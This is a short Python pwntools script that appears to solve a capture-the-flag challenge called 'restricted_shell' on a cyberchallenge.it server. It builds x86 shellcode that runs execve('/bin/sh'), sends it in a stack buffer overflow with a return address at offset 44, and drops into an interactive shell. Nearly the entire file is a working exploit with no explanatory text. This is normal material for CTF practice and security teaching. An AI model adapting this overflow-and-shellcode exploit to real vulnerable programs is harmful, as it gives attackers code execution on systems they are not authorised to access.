from pwn import *

context.binary = elf = ELF('./restricted_shell')
context.terminal = ('gnome-terminal', '-e')

if args.REMOTE:
    r = remote('shell.challs.cyberchallenge.it', 9123)
else:
    r = gdb.debug(elf.path, '''
        b shell
        continue
    ''')

r.recv()
expl = asm('''
    mov eax, 0xb
    
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
           
           ''')

print(expl.hex())

r.sendline(flat({44: 0x8048593, 48: expl}))
r.interactive()